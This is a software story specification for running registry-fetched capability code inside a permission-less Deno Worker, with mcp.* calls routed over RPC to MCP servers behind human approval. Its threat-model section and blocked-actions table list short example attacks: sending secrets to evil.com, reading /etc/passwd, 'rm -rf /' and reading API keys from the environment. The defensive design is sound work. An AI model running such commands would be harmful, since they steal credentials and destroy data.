# Story 14.5: Sandboxed Capability Code Execution

Status: ready-for-dev

> **Epic:** 14 - JSR Package Local/Cloud MCP Routing
> **FR Coverage:** FR14-5 (Sandboxed execution for registry capability code)
> **Prerequisites:** Story 14.4 (Dynamic MCP Loader - DONE)
> **Previous Story:** 14-4-dynamic-mcp-loader-registry.md

## Story

As a security-conscious developer,
I want capability code fetched from the registry to execute in an isolated sandbox,
So that potentially malicious or buggy capability code cannot directly access my system.

## Architecture (Clarified 2026-01-06)

**Key Insight:** Sandbox the **capability code**, not the **MCP servers**.

```
Capability Code (from pml.casys.ai/mcp/{fqdn})
    │
    ▼
┌─────────────────────────────────────┐
│  SANDBOX (Deno Worker)              │
│  - permissions: "none"              │
│  - No filesystem access             │
│  - No network access                │
│  - No subprocess spawning           │
│  - Only exit: mcp.* RPC proxy       │
│                                     │
│  mcp.filesystem.read_file(path)     │
│       │                             │
└───────┼─────────────────────────────┘
        │ RPC message
        ▼
   Main Thread (PML)
        │
        ▼
   StdioManager.call("filesystem", "read_file", {path})
        │
        ▼
┌─────────────────────────────────────┐
│  MCP Server (filesystem)            │
│  - Full system access               │
│  - NOT sandboxed                    │
│  - Security = HIL (Story 14.3b)     │
└─────────────────────────────────────┘
        │
        ▼
   User's actual files
```

**What gets sandboxed vs what doesn't:**

| Component | Sandboxed? | Why |
|-----------|------------|-----|
| **Capability code** (from registry) | ✅ Yes | Untrusted external code |
| **MCP servers** (filesystem, shell, serena) | ❌ No | Need full access - that's their job |

**Security model:**
- Capability code = isolated, can only communicate via mcp.* RPC
- MCP servers = full access, protected by HIL approval (Story 14.3b)

## Problem Context

### Current State (After Story 14.4)

| Component | Status | Description |
|-----------|--------|-------------|
| CapabilityLoader | ✅ DONE | Fetches and imports capability code |
| StdioManager | ✅ DONE | Manages MCP server subprocesses |
| HIL approval | ✅ DONE | User approves dangerous MCP calls |
| mcp.* proxy | ✅ DONE | Routes calls to MCP servers |
| **Sandbox isolation** | ❌ MISSING | Capability code runs with full permissions |

### Why Sandbox Capability Code?

Without sandboxing, malicious capability code from registry could:
- Read files directly (`Deno.readFile("/etc/passwd")`)
- Exfiltrate data via network (`fetch("https://evil.com", {body: secrets})`)
- Spawn processes (`new Deno.Command("rm", {args: ["-rf", "/"]})`)
- Access environment variables with API keys

**With sandbox:**
- Capability code has `permissions: "none"`
- Only way to do anything = call `mcp.filesystem.*`, `mcp.shell.*`, etc.
- Those calls go through HIL if tool is in "ask" list
- User stays in control

## Acceptance Criteria

### AC1-2: Sandbox Isolation for Capability Code

**Given** capability code fetched from `pml.casys.ai/mcp/{fqdn}`
**When** executed by PML
**Then** it runs in a Deno Worker with `permissions: "none"`
**And** direct filesystem access throws `PermissionDenied`
**And** direct network access throws `PermissionDenied`
**And** direct subprocess spawning throws `PermissionDenied`

**Given** capability code attempts `await Deno.readFile("/etc/passwd")`
**When** executed in sandbox
**Then** it throws `PermissionDenied: Requires read access to "/etc/passwd"`
**And** the operation is blocked

### AC3-4: mcp.* Proxy as Only Exit

**Given** capability code in sandbox
**When** it calls `mcp.filesystem.read_file({path: "/home/user/file.txt"})`
**Then** the call is serialized as RPC message to main thread
**And** main thread routes to StdioManager
**And** MCP server executes with full permissions
**And** result is returned to sandbox

**Given** capability code calls `mcp.shell.exec({command: "ls -la"})`
**When** the tool is in user's "ask" list
**Then** HIL approval is triggered (Story 14.3b)
**And** execution waits for user approval
**And** only proceeds if approved

### AC5-6: No Direct System Access

**Given** capability code in sandbox
**When** it attempts `fetch("https://api.example.com/data")`
**Then** it throws `PermissionDenied: Requires net access`
**And** the request is NOT made

**Given** capability code needs to make HTTP requests
**When** properly designed
**Then** it should use `mcp.http.fetch()` or similar MCP tool
**And** that call goes through normal HIL flow

### AC7-8: Timeout and Resource Limits

**Given** capability code in sandbox
**When** it runs for longer than 5 minutes
**Then** the Worker is terminated
**And** an error is returned: "Execution timeout"

**Given** capability code attempts infinite loop
**When** timeout expires
**Then** Worker is forcefully terminated
**And** resources are cleaned up

## Tasks / Subtasks

### Phase 1: Sandbox Worker Infrastructure (~1h)

- [ ] Task 1: Create sandbox worker runner (AC: #1, #2)
  - [ ] Create `packages/pml/src/sandbox/execution/worker-runner.ts`
  - [ ] Implement `SandboxWorker` class with `permissions: "none"`:
    ```typescript
    class SandboxWorker {
      private worker: Worker;

      constructor() {
        this.worker = new Worker(
          new URL("./sandbox-script.ts", import.meta.url),
          {
            type: "module",
            deno: { permissions: "none" }, // Total isolation
          }
        );
      }

      async execute(code: string, args: unknown): Promise<unknown>;
      shutdown(): void;
    }
    ```
  - [ ] Handle Worker lifecycle (create, execute, terminate)
  - [ ] Implement execution timeout (5 minutes)

- [ ] Task 2: Create sandbox types (AC: #1-8)
  - [ ] Create `packages/pml/src/sandbox/types.ts`
  - [ ] Define `SandboxResult`, `SandboxError`, `RpcMessage` types
  - [ ] Export from `packages/pml/src/sandbox/mod.ts`

### Phase 2: Worker Script & RPC Bridge (~1.5h)

- [ ] Task 3: Create sandbox worker script (AC: #3, #4)
  - [ ] Create `packages/pml/src/sandbox/execution/sandbox-script.ts`
  - [ ] Implement mcp.* proxy that sends RPC to main thread:
    ```typescript
    const mcp = new Proxy({}, {
      get: (_, namespace: string) => new Proxy({}, {
        get: (_, action: string) => async (args: unknown) => {
          // Send RPC to main thread, wait for response
          return await sendRpc(`${namespace}:${action}`, args);
        },
      }),
    });
    ```
  - [ ] Implement message handler for execute requests
  - [ ] Inject `mcp` proxy into capability code context

- [ ] Task 4: Implement RPC bridge (AC: #3, #4)
  - [ ] Create `packages/pml/src/sandbox/execution/rpc-bridge.ts`
  - [ ] Implement bidirectional messaging:
    - Worker → Main: `{type: "rpc", id, method, args}`
    - Main → Worker: `{type: "rpc_response", id, result}`
  - [ ] Track pending requests by ID
  - [ ] Implement RPC timeout (30 seconds per call)

### Phase 3: Integration with CapabilityLoader (~1h)

- [ ] Task 5: Modify CapabilityLoader for sandboxed execution (AC: all)
  - [ ] Update `packages/pml/src/loader/capability-loader.ts`
  - [ ] Route capability execution through sandbox:
    ```typescript
    async executeCapability(code: string, args: unknown): Promise<unknown> {
      const sandbox = new SandboxWorker();
      try {
        // Execute in sandbox, mcp.* calls come back via RPC
        return await sandbox.execute(code, args);
      } finally {
        sandbox.shutdown();
      }
    }
    ```
  - [ ] Handle RPC requests from sandbox → route to StdioManager
  - [ ] Pass results back to sandbox

- [ ] Task 6: Wire RPC to existing infrastructure (AC: #3, #4)
  - [ ] Route `mcp.{namespace}.{action}` to appropriate handler:
    - Check if namespace is a loaded MCP dep → StdioManager
    - Check routing config → cloud or local
  - [ ] Integrate with HIL flow (Story 14.3b)
  - [ ] Return results through RPC bridge

### Phase 4: Constants & Error Handling (~30m)

- [ ] Task 7: Create constants and timeout handler
  - [ ] Create `packages/pml/src/sandbox/constants.ts`:
    ```typescript
    export const SANDBOX_EXECUTION_TIMEOUT_MS = 5 * 60 * 1000; // 5 min
    export const SANDBOX_RPC_TIMEOUT_MS = 30 * 1000; // 30 sec
    ```
  - [ ] Create `packages/pml/src/sandbox/execution/timeout-handler.ts` (Phase 2.4 aligned):
    ```typescript
    export class TimeoutHandler {
      wrap<T>(promise: Promise<T>, timeoutMs: number): Promise<T>;
    }
    ```

- [ ] Task 8: Implement error handling (AC: #1, #2, #5, #6)
  - [ ] Catch `PermissionDenied` errors in sandbox
  - [ ] Format clear error messages explaining what was blocked
  - [ ] Log blocked attempts for debugging

### Phase 5: Tests (~1.5h)

- [ ] Task 9: Unit tests for sandbox isolation
  - [ ] Test that `Deno.readFile()` throws in sandbox
  - [ ] Test that `fetch()` throws in sandbox
  - [ ] Test that `Deno.Command` throws in sandbox

- [ ] Task 10: Unit tests for RPC bridge
  - [ ] Test mcp.* proxy sends RPC messages
  - [ ] Test response routing back to sandbox
  - [ ] Test timeout handling

- [ ] Task 11: Integration tests
  - [ ] Test full flow: load capability → sandbox → mcp.* call → result
  - [ ] Test HIL integration via mcp.* calls
  - [ ] Test execution timeout

## Dev Notes

### Sandbox Execution Flow

```typescript
// packages/pml/src/sandbox/execution/worker-runner.ts

import * as log from "@std/log";
import { SANDBOX_EXECUTION_TIMEOUT_MS } from "../constants.ts";

export class SandboxWorker {
  private worker: Worker;
  private pending = new Map<string, PromiseResolver>();

  constructor(private onRpc: RpcHandler) {
    this.worker = new Worker(
      new URL("./sandbox-script.ts", import.meta.url),
      {
        type: "module",
        deno: { permissions: "none" }, // 🔒 Total isolation
      }
    );

    this.worker.onmessage = this.handleMessage.bind(this);
    this.worker.onerror = (e) => log.error(`Sandbox error: ${e.message}`);
  }

  async execute(code: string, args: unknown): Promise<unknown> {
    const id = crypto.randomUUID();

    return new Promise((resolve, reject) => {
      this.pending.set(id, { resolve, reject });

      // Send code to sandbox for execution
      this.worker.postMessage({ type: "execute", id, code, args });

      // Timeout
      setTimeout(() => {
        if (this.pending.has(id)) {
          this.pending.delete(id);
          reject(new Error("Sandbox execution timeout (5 min)"));
          this.shutdown();
        }
      }, SANDBOX_EXECUTION_TIMEOUT_MS);
    });
  }

  private async handleMessage(event: MessageEvent) {
    const { type, id, ...data } = event.data;

    if (type === "result") {
      this.pending.get(id)?.resolve(data.value);
      this.pending.delete(id);
    } else if (type === "error") {
      this.pending.get(id)?.reject(new Error(data.error));
      this.pending.delete(id);
    } else if (type === "rpc") {
      // mcp.* call from sandbox - route through normal infrastructure
      try {
        const result = await this.onRpc(data.method, data.args);
        this.worker.postMessage({ type: "rpc_response", id: data.rpcId, result });
      } catch (error) {
        this.worker.postMessage({ type: "rpc_error", id: data.rpcId, error: String(error) });
      }
    }
  }

  shutdown() {
    this.worker.terminate();
  }
}
```

### Sandbox Worker Script

```typescript
// packages/pml/src/sandbox/execution/sandbox-script.ts

// This runs in isolated Worker with permissions: "none"
// Only way to interact with outside world = postMessage RPC

const pending = new Map<string, { resolve: Function; reject: Function }>();
let rpcId = 0;

// Create mcp.* proxy - the ONLY way capability code can do anything
const mcp = new Proxy({}, {
  get: (_, namespace: string) => new Proxy({}, {
    get: (_, action: string) => async (args: unknown) => {
      const id = String(++rpcId);

      return new Promise((resolve, reject) => {
        pending.set(id, { resolve, reject });

        // Send RPC to main thread
        self.postMessage({
          type: "rpc",
          rpcId: id,
          method: `${namespace}:${action}`,
          args,
        });
      });
    },
  }),
});

// Handle messages from main thread
self.onmessage = async (event: MessageEvent) => {
  const { type, id, ...data } = event.data;

  if (type === "execute") {
    try {
      // Execute capability code with mcp proxy available
      const fn = new Function("mcp", "args", `
        return (async () => {
          ${data.code}
        })();
      `);

      const result = await fn(mcp, data.args);
      self.postMessage({ type: "result", id, value: result });
    } catch (error) {
      self.postMessage({ type: "error", id, error: String(error) });
    }
  } else if (type === "rpc_response") {
    pending.get(data.id)?.resolve(data.result);
    pending.delete(data.id);
  } else if (type === "rpc_error") {
    pending.get(data.id)?.reject(new Error(data.error));
    pending.delete(data.id);
  }
};
```

### Integration in CapabilityLoader

```typescript
// In packages/pml/src/loader/capability-loader.ts

async call(toolId: string, args: unknown): Promise<unknown> {
  const loaded = await this.load(toolId);

  // Create sandbox with RPC handler
  const sandbox = new SandboxWorker(async (method, rpcArgs) => {
    // Route mcp.* calls through existing infrastructure
    return await this.routeMcpCall(method, rpcArgs);
  });

  try {
    // Execute capability code in sandbox
    return await sandbox.execute(loaded.code, args);
  } finally {
    sandbox.shutdown();
  }
}

private async routeMcpCall(method: string, args: unknown): Promise<unknown> {
  const [namespace, action] = method.split(":");

  // Check if it's a declared MCP dependency
  const dep = this.currentMeta?.mcp_deps?.find(d => d.name === namespace);
  if (dep?.type === "stdio") {
    return this.stdioManager.call(namespace, method, args);
  }

  // Check routing for other calls
  const routing = resolveRouting(method);
  if (routing === "server") {
    return this.cloudClient.call(method, args);
  }

  // Local capability - recursive (also sandboxed)
  return this.call(method, args);
}
```

### What the Sandbox Blocks

| Attempt | Result |
|---------|--------|
| `Deno.readFile("/etc/passwd")` | ❌ `PermissionDenied` |
| `fetch("https://evil.com")` | ❌ `PermissionDenied` |
| `new Deno.Command("rm", ...)` | ❌ `PermissionDenied` |
| `Deno.env.get("API_KEY")` | ❌ `PermissionDenied` |
| `mcp.filesystem.read_file({path})` | ✅ RPC → HIL → MCP server |
| `mcp.shell.exec({command})` | ✅ RPC → HIL → MCP server |

### Project Structure (Aligned with Phase 2.4)

**Files to Create:**
```
packages/pml/src/sandbox/
├── mod.ts                        # Exports
├── types.ts                      # SandboxResult, RpcMessage types
├── constants.ts                  # Timeout values
└── execution/                    # ← Same structure as Phase 2.4
    ├── worker-runner.ts          # SandboxWorker class (was: worker-wrapper.ts)
    ├── sandbox-script.ts         # Worker-side code (permissions: none)
    ├── rpc-bridge.ts             # RPC message handling
    └── timeout-handler.ts        # Timeout logic (extracted)

packages/pml/tests/
├── sandbox_isolation_test.ts     # Permission denial tests
├── sandbox_rpc_test.ts           # RPC bridge tests
└── sandbox_integration_test.ts   # Full flow tests
```

**Files to Modify:**
```
packages/pml/src/loader/capability-loader.ts  # Route execution through sandbox
packages/pml/src/types.ts                     # Add sandbox types
```

**Naming Alignment with Phase 2.4:**
| Story 14.5 | Phase 2.4 equivalent | Rationale |
|------------|---------------------|-----------|
| `execution/worker-runner.ts` | `execution/worker-runner.ts` | Same name |
| `execution/timeout-handler.ts` | `execution/timeout-handler.ts` | Same name |
| `execution/rpc-bridge.ts` | N/A (14.5 specific) | RPC for isolated sandbox |
| `execution/sandbox-script.ts` | N/A (14.5 specific) | Worker-side script |

### Security Model Summary

```
┌─────────────────────────────────────────────────────────────┐
│                    TRUST BOUNDARY                           │
├─────────────────────────────────────────────────────────────┤
│  UNTRUSTED (Sandboxed)          │  TRUSTED (Full access)   │
│  ─────────────────────          │  ────────────────────    │
│  Capability code from registry  │  PML main thread         │
│  - permissions: "none"          │  MCP servers (stdio)     │
│  - Only mcp.* RPC allowed       │  User's system           │
│                                 │                          │
│  Security: Isolation            │  Security: HIL approval  │
└─────────────────────────────────────────────────────────────┘
```

### Logging

Use `@std/log` for debug output:

```typescript
import * as log from "@std/log";

log.debug(`Sandbox: executing capability ${toolId}`);
log.debug(`Sandbox: RPC call ${method}`);
log.info(`Sandbox: execution complete in ${duration}ms`);
log.warn(`Sandbox: blocked direct ${blockedAction} attempt`);
```

### References

- [Source: packages/pml/src/loader/capability-loader.ts] - Current execution flow
- [Source: packages/pml/src/loader/stdio-manager.ts] - MCP server subprocess management
- [Source: src/sandbox/worker-bridge.ts] - Reference pattern for Worker RPC
- [Source: Epic 14] - Overall architecture

## Estimation

- **Effort:** 2-3 days (simplified from original 3-4)
- **LOC:** ~500-600 net
  - sandbox/types.ts: ~30 lines
  - sandbox/constants.ts: ~10 lines
  - sandbox/worker-wrapper.ts: ~100 lines
  - sandbox/sandbox-script.ts: ~80 lines
  - sandbox/rpc-bridge.ts: ~60 lines
  - capability-loader.ts modifications: ~40 lines
  - tests: ~200 lines
- **Risk:** Low-Medium
  - Worker with `permissions: "none"` is well-documented Deno feature
  - RPC bridge pattern already proven in src/sandbox/

## Open Questions

1. **Reuse Worker or create new per execution?**
   - Proposal: New Worker per execution (clean slate, no state leakage)
   - Trade-off: ~10-50ms overhead per execution

2. **What if capability code needs env vars?**
   - Proposal: Pass specific vars as args, not via `Deno.env`
   - Capability declares needed vars in metadata, PML passes them

## Future: Phase 2.4 Alignment

**Reference:** `_bmad-output/implementation-artifacts/tech-specs/architecture-refactor-phase2/phase-2.4-sandbox.md`

### Current Approach (Story 14.5) - Now Aligned!

```
packages/pml/src/sandbox/     # Same structure as Phase 2.4
├── mod.ts
├── types.ts
├── constants.ts
└── execution/                # ← Matches Phase 2.4
    ├── worker-runner.ts      # Same name as Phase 2.4
    ├── sandbox-script.ts
    ├── rpc-bridge.ts
    └── timeout-handler.ts    # Same name as Phase 2.4
```

### Future Opportunity (After Phase 2.4)

Phase 2.4 will refactor `src/sandbox/executor.ts` (1,302 lines) into modular `lib/sandbox/`:

```
lib/sandbox/                   # Shared library (post Phase 2.4)
├── execution/
│   ├── deno-runner.ts         # Subprocess execution
│   ├── worker-runner.ts       # Worker-based execution
│   ├── result-parser.ts
│   └── timeout-handler.ts
├── security/
│   ├── permission-mapper.ts
│   └── path-validator.ts
└── tools/
    └── injector.ts
```

### Migration Path

| Phase | Action |
|-------|--------|
| **Now (14.5)** | Standalone sandbox in `packages/pml/src/sandbox/` |
| **Phase 2.4** | Refactor `src/sandbox/` → `lib/sandbox/` with modular structure |
| **After 2.4** | `packages/pml/` can import from `lib/sandbox/` for shared code |

### Architecture Alignment

Story 14.5 now uses **identical naming** to Phase 2.4:

| Phase 2.4 | Story 14.5 | Status |
|-----------|------------|--------|
| `execution/worker-runner.ts` | `execution/worker-runner.ts` | ✅ Same |
| `execution/timeout-handler.ts` | `execution/timeout-handler.ts` | ✅ Same |
| `WorkerRunner` class | `SandboxWorker` class | Similar (can rename) |
| `TimeoutHandler` class | `TimeoutHandler` class | ✅ Same |

**Migration to lib/sandbox/ after Phase 2.4:**
1. Move files from `packages/pml/src/sandbox/` to `lib/sandbox/`
2. Update imports
3. Done - no structural changes needed!

---

## Dev Agent Record

### Agent Model Used

{{agent_model_name_version}}

### Debug Log References

### Completion Notes List

### Change Log

| Date | Change | Author |
|------|--------|--------|
| 2026-01-06 | Story created - initial version with workspace-scoped sandbox | Claude Opus 4.5 |
| 2026-01-06 | Refactored: Sandbox capability code only, not MCP servers | Claude Opus 4.5 |
| 2026-01-06 | Added Phase 2.4 alignment section - future lib/sandbox/ opportunity | Claude Opus 4.5 |
| 2026-01-06 | Aligned file naming with Phase 2.4: execution/ subdirectory structure | Claude Opus 4.5 |

### File List

